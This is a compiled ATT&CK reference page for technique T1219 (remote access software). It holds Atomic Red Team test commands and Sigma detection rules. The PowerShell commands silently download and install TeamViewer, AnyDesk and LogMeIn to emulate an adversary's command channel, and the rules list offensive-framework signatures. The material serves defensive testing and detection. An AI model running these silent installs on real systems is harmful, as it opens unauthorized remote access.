
# Remote Access Software

## Description

### MITRE Description

> An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)

Remote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.

Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: ['User']
* Platforms: ['Linux', 'Windows', 'macOS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1219

## Potential Commands

```
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
Start-Process $file1 /S;
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'

Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
Start-Process $file1 /S;

Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
Start-Process $file1 /S;
Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"

powershell/management/vnc
powershell/management/vnc
python/management/osx/screen_sharing
python/management/osx/screen_sharing
```

## Commands Dataset

```
[{'command': 'Invoke-WebRequest -OutFile '
             'C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe '
             'https://download.teamviewer.com/download/TeamViewer_Setup.exe\n'
             '$file1 = "C:\\Users\\" + $env:username + '
             '"\\Desktop\\TeamViewer_Setup.exe"\n'
             'Start-Process $file1 /S;\n'
             "Start-Process 'C:\\Program Files "
             "(x86)\\TeamViewer\\TeamViewer.exe'\n",
  'name': None,
  'source': 'atomics/T1219/T1219.yaml'},
 {'command': 'Invoke-WebRequest -OutFile '
             'C:\\Users\\$env:username\\Desktop\\AnyDesk.exe '
             'https://download.anydesk.com/AnyDesk.exe\n'
             '$file1 = "C:\\Users\\" + $env:username + '
             '"\\Desktop\\AnyDesk.exe"\n'
             'Start-Process $file1 /S;\n',
  'name': None,
  'source': 'atomics/T1219/T1219.yaml'},
 {'command': 'Invoke-WebRequest -OutFile '
             'C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi '
             'https://secure.logmein.com/LogMeInIgnition.msi\n'
             '$file1 = "C:\\Users\\" + $env:username + '
             '"\\Desktop\\LogMeInIgnition.msi"\n'
             'Start-Process $file1 /S;\n'
             "Start-Process 'C:\\Program Files "
             '(x86)\\LogMeInIgnition\\LMIIgnition.exe\' "/S"\n',
  'name': None,
  'source': 'atomics/T1219/T1219.yaml'},
 {'command': 'powershell/management/vnc',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/vnc',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/osx/screen_sharing',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/osx/screen_sharing',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2018/09/09',
                  'description': 'Detects a highly relevant Antivirus alert '
                                 'that reports an exploitation framework',
                  'detection': {'condition': 'selection',
                                'selection': {'Signature': ['*MeteTool*',
                                                            '*MPreter*',
                                                            '*Meterpreter*',
                                                            '*Metasploit*',
                                                            '*PowerSploit*',
                                                            '*CobaltSrike*',
                                                            '*Swrort*',
                                                            '*Rozena*',
                                                            '*Backdoor.Cobalt*']}},
                  'falsepositives': ['Unlikely'],
                  'fields': ['FileName', 'User'],
                  'id': '238527ad-3c2c-4e4f-a1f6-92fd63adb864',
                  'level': 'critical',
                  'logsource': {'product': 'antivirus'},
                  'modified': '2019/01/16',
                  'references': ['https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/'],
                  'tags': ['attack.execution',
                           'attack.t1203',
                           'attack.command_and_control',
                           'attack.t1219'],
                  'title': 'Antivirus Exploitation Framework Detection'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/03/17',
                  'description': 'Detects a tscon.exe start as LOCAL SYSTEM',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': '*\\tscon.exe',
                                              'User': 'NT AUTHORITY\\SYSTEM'}},
                  'falsepositives': ['Unknown'],
                  'id': '9847f263-4a81-424f-970c-875dab15b79b',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html',
                                 'https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6'],
                  'status': 'experimental',
                  'tags': ['attack.command_and_control', 'attack.t1219'],
                  'title': 'Suspicious TSCON Start'}},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Network intrusion detection system']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Network intrusion detection system']},
 {'data_source': ['Network protocol analysis']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Remote Access Software': {'atomic_tests': [{'auto_generated_guid': '8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0',
                                                                      'description': 'An '
                                                                                     'adversary '
                                                                                     'may '
                                                                                     'attempt '
                                                                                     'to '
                                                                                     'trick '
                                                                                     'the '
                                                                                     'user '
                                                                                     'into '
                                                                                     'downloading '
                                                                                     'teamviewer '
                                                                                     'and '
                                                                                     'using '
                                                                                     'this '
                                                                                     'to '
                                                                                     'maintain '
                                                                                     'access '
                                                                                     'to '
                                                                                     'the '
                                                                                     'machine. '
                                                                                     'Download '
                                                                                     'of '
                                                                                     'TeamViewer '
                                                                                     'installer '
                                                                                     'will '
                                                                                     'be '
                                                                                     'at '
                                                                                     'the '
                                                                                     'destination '
                                                                                     'location '
                                                                                     'when '
                                                                                     'sucessfully '
                                                                                     'executed.\n',
                                                                      'executor': {'cleanup_command': '$file '
                                                                                                      '= '
                                                                                                      "'C:\\Program "
                                                                                                      'Files '
                                                                                                      "(x86)\\TeamViewer\\uninstall.exe'\n"
                                                                                                      'if(Test-Path '
                                                                                                      '$file){ '
                                                                                                      'Start-Process '
                                                                                                      '$file '
                                                                                                      '"/S" '
                                                                                                      '-ErrorAction '
                                                                                                      'Ignore '
                                                                                                      '| '
                                                                                                      'Out-Null '
                                                                                                      '}\n'
                                                                                                      '$file1 '
                                                                                                      '= '
                                                                                                      '"C:\\Users\\" '
                                                                                                      '+ '
                                                                                                      '$env:username '
                                                                                                      '+ '
                                                                                                      '"\\Desktop\\TeamViewer_Setup.exe"\n'
                                                                                                      'Remove-Item '
                                                                                                      '$file1 '
                                                                                                      '-ErrorAction '
                                                                                                      'Ignore '
                                                                                                      '| '
                                                                                                      'Out-Null',
                                                                                   'command': 'Invoke-WebRequest '
                                                                                              '-OutFile '
                                                                                              'C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe '
                                                                                              'https://download.teamviewer.com/download/TeamViewer_Setup.exe\n'
                                                                                              '$file1 '
                                                                                              '= '
                                                                                              '"C:\\Users\\" '
                                                                                              '+ '
                                                                                              '$env:username '
                                                                                              '+ '
                                                                                              '"\\Desktop\\TeamViewer_Setup.exe"\n'
                                                                                              'Start-Process '
                                                                                              '$file1 '
                                                                                              '/S;\n'
                                                                                              'Start-Process '
                                                                                              "'C:\\Program "
                                                                                              'Files '
                                                                                              "(x86)\\TeamViewer\\TeamViewer.exe'\n",
                                                                                   'elevation_required': True,
                                                                                   'name': 'powershell'},
                                                                      'name': 'TeamViewer '
                                                                              'Files '
                                                                              'Detected '
                                                                              'Test '
                                                                              'on '
                                                                              'Windows',
                                                                      'supported_platforms': ['windows']},
                                                                     {'auto_generated_guid': '6b8b7391-5c0a-4f8c-baee-78d8ce0ce330',
                                                                      'description': 'An '
                                                                                     'adversary '
                                                                                     'may '
                                                                                     'attempt '
                                                                                     'to '
                                                                                     'trick '
                                                                                     'the '
                                                                                     'user '
                                                                                     'into '
                                                                                     'downloading '
                                                                                     'AnyDesk '
                                                                                     'and '
                                                                                     'use '
                                                                                     'to '
                                                                                     'establish '
                                                                                     'C2. '
                                                                                     'Download '
                                                                                     'of '
                                                                                     'AnyDesk '
                                                                                     'installer '
                                                                                     'will '
                                                                                     'be '
                                                                                     'at '
                                                                                     'the '
                                                                                     'destination '
                                                                                     'location '
                                                                                     'and '
                                                                                     'ran '
                                                                                     'when '
                                                                                     'sucessfully '
                                                                                     'executed.\n',
                                                                      'executor': {'cleanup_command': '$file1 '
                                                                                                      '= '
                                                                                                      '"C:\\Users\\" '
                                                                                                      '+ '
                                                                                                      '$env:username '
                                                                                                      '+ '
                                                                                                      '"\\Desktop\\AnyDesk.exe.exe"\n'
                                                                                                      'Remove-Item '
                                                                                                      '$file1 '
                                                                                                      '-ErrorAction '
                                                                                                      'Ignore',
                                                                                   'command': 'Invoke-WebRequest '
                                                                                              '-OutFile '
                                                                                              'C:\\Users\\$env:username\\Desktop\\AnyDesk.exe '
                                                                                              'https://download.anydesk.com/AnyDesk.exe\n'
                                                                                              '$file1 '
                                                                                              '= '
                                                                                              '"C:\\Users\\" '
                                                                                              '+ '
                                                                                              '$env:username '
                                                                                              '+ '
                                                                                              '"\\Desktop\\AnyDesk.exe"\n'
                                                                                              'Start-Process '
                                                                                              '$file1 '
                                                                                              '/S;\n',
                                                                                   'elevation_required': True,
                                                                                   'name': 'powershell'},
                                                                      'name': 'AnyDesk '
                                                                              'Files '
                                                                              'Detected '
                                                                              'Test '
                                                                              'on '
                                                                              'Windows',
                                                                      'supported_platforms': ['windows']},
                                                                     {'auto_generated_guid': 'd03683ec-aae0-42f9-9b4c-534780e0f8e1',
                                                                      'description': 'An '
                                                                                     'adversary '
                                                                                     'may '
                                                                                     'attempt '
                                                                                     'to '
                                                                                     'trick '
                                                                                     'the '
                                                                                     'user '
                                                                                     'into '
                                                                                     'downloading '
                                                                                     'LogMeIn '
                                                                                     'and '
                                                                                     'use '
                                                                                     'to '
                                                                                     'establish '
                                                                                     'C2. '
                                                                                     'Download '
                                                                                     'of '
                                                                                     'LogMeIn '
                                                                                     'installer '
                                                                                     'will '
                                                                                     'be '
                                                                                     'at '
                                                                                     'the '
                                                                                     'destination '
                                                                                     'location '
                                                                                     'and '
                                                                                     'ran '
                                                                                     'when '
                                                                                     'sucessfully '
                                                                                     'executed.\n',
                                                                      'executor': {'cleanup_command': 'get-package '
                                                                                                      "*'LogMeIn "
                                                                                                      "Client'* "
                                                                                                      '-ErrorAction '
                                                                                                      'Ignore '
                                                                                                      '| '
                                                                                                      'uninstall-package \n'
                                                                                                      '$file1 '
                                                                                                      '= '
                                                                                                      '"C:\\Users\\" '
                                                                                                      '+ '
                                                                                                      '$env:username '
                                                                                                      '+ '
                                                                                                      '"\\Desktop\\LogMeInIgnition.msi"\n'
                                                                                                      'Remove-Item '
                                                                                                      '$file1 '
                                                                                                      '-ErrorAction '
                                                                                                      'Ignore',
                                                                                   'command': 'Invoke-WebRequest '
                                                                                              '-OutFile '
                                                                                              'C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi '
                                                                                              'https://secure.logmein.com/LogMeInIgnition.msi\n'
                                                                                              '$file1 '
                                                                                              '= '
                                                                                              '"C:\\Users\\" '
                                                                                              '+ '
                                                                                              '$env:username '
                                                                                              '+ '
                                                                                              '"\\Desktop\\LogMeInIgnition.msi"\n'
                                                                                              'Start-Process '
                                                                                              '$file1 '
                                                                                              '/S;\n'
                                                                                              'Start-Process '
                                                                                              "'C:\\Program "
                                                                                              'Files '
                                                                                              "(x86)\\LogMeInIgnition\\LMIIgnition.exe' "
                                                                                              '"/S"\n',
                                                                                   'elevation_required': True,
                                                                                   'name': 'powershell'},
                                                                      'name': 'LogMeIn '
                                                                              'Files '
                                                                              'Detected '
                                                                              'Test '
                                                                              'on '
                                                                              'Windows',
                                                                      'supported_platforms': ['windows']}],
                                                    'attack_technique': 'T1219',
                                                    'display_name': 'Remote '
                                                                    'Access '
                                                                    'Software'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1219',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/vnc":  '
                                                                                 '["T1219"],',
                                            'Empire Module': 'powershell/management/vnc',
                                            'Technique': 'Remote Access '
                                                         'Tools'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1219',
                                            'ATT&CK Technique #2': 'T1021',
                                            'Concatenate for Python Dictionary': '"python/management/osx/screen_sharing":  '
                                                                                 '["T1219","T1021"],',
                                            'Empire Module': 'python/management/osx/screen_sharing',
                                            'Technique': 'Remote Access '
                                                         'Tools'}}]
```

# Tactics


* [Command and Control](../tactics/Command-and-Control.md)


# Mitigations


* [Remote Access Tools Mitigation](../mitigations/Remote-Access-Tools-Mitigation.md)

* [Network Intrusion Prevention](../mitigations/Network-Intrusion-Prevention.md)
    
* [Execution Prevention](../mitigations/Execution-Prevention.md)
    
* [Filter Network Traffic](../mitigations/Filter-Network-Traffic.md)
    

# Actors


* [Thrip](../actors/Thrip.md)

* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Night Dragon](../actors/Night-Dragon.md)
    
* [Carbanak](../actors/Carbanak.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [RTM](../actors/RTM.md)
    
* [DarkVishnya](../actors/DarkVishnya.md)
    
* [Sandworm Team](../actors/Sandworm-Team.md)
    
